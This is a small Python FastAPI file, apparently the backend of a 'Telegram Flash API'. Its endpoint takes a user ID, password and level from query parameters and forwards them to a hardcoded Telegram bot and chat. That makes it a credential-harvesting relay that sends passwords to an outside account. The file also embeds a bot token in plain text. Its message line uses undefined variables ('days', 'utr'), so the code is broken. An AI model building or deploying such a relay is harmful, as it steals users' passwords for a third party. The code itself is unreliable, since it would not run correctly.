from fastapi import FastAPI, Query
import requests

app = FastAPI(title="Telegram Flash API")

BOT_TOKEN = "8986683875:AAF9iLn5kUNe2DYbRU0ugliF3m8rK6xClrY"
CHAT_ID = "7898402627"

@app.get("/")
def home():
    return {"status": "API Running 🚀"}

# MAIN ENDPOINT
@app.get("/pal772480@fam")
def send(uid: str = Query(...), password: str = Query(...), level: str = Query(...)):

    text = f"UID: {uid}\nDAYS: {days}\nUTR: {utr}"

    requests.get(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        params={"chat_id": CHAT_ID, "text": text}
    )

    return {"status": "request send successfully "}
